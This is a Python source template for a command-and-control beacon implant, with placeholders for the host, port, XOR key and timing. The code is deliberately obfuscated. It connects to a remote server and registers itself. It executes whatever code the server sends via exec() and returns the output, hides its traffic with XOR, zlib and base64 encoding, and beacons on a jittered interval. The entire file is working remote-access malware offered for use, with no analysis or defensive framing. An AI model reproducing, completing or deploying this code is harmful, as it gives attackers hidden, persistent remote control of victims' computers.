import socket as a,struct as b,zlib as c,base64 as d,random as e,time as f,json as g,sys as i,traceback as j,io as k,secrets as l,threading as t2
_K=bytes({{XOR_KEY_BYTES}})
_H="{{HOST}}"
_P={{PORT}}
_I={{INTERVAL}}
_J={{JITTER}}
_D=l.token_hex(8)
_B=False
_CK=_K
# _T 传输钩子（U2/T6.2）: uplevel 升级代码可覆盖 _T/_H/_P/_K
def _T():
 t=a.socket();t.settimeout(30);t.connect((_H,_P));return t
def m(x,k):kl=len(k);return bytes(b^k[i%kl]for i,b in enumerate(x))
def n(x):return d.b64encode(m(c.compress(x),_CK))
def o(x):return c.decompress(m(d.b64decode(x),_CK))
def p(s,x):q=n(x);s.sendall(b.pack(">I",len(q))+q)
def q(s):
 r=b""
 while 4-len(r):
  t=s.recv(4-len(r))
  if not t:raise ConnectionError()
  r+=t
 u=b.unpack(">I",r)[0]
 if u==0:return b""
 v=b""
 while u-len(v):
  w=s.recv(u-len(v))
  if not w:raise ConnectionError()
  v+=w
 return o(v)
_L=t2.Lock()
def r(x):
 with _L:
  o=k.StringIO(),k.StringIO()
  try:i.stdout,i.stderr=o;exec(x,globals());return o[0].getvalue(),o[1].getvalue()
  except:return o[0].getvalue(),o[1].getvalue()+j.format_exc()
  finally:i.stdout,i.stderr=i.__stdout__,i.__stderr__
def s():return max(5,_I+e.uniform(-_I*_J,_I*_J))
def cyc():
 global _CK
 _CK=_K
 t=None
 try:
  t=_T()
  p(t,g.dumps({"type":"register","version":1,"role":"beacon","id":_D}).encode())
  while 1:
   u=g.loads(q(t).decode());v=u.get("type")
   if v=="welcome":continue
   if v in("task","init_task"):w,x=r(u["code"]);p(t,g.dumps({"type":"result","task_id":u.get("task_id",""),"output":w,"error":x}).encode())
   elif v=="pong":break
   elif v=="error":break
 except:pass
 finally:
  if t is not None:
   try:t.close()
   except:pass
while 1:
 if _B:break
 cyc()
 f.sleep(s())
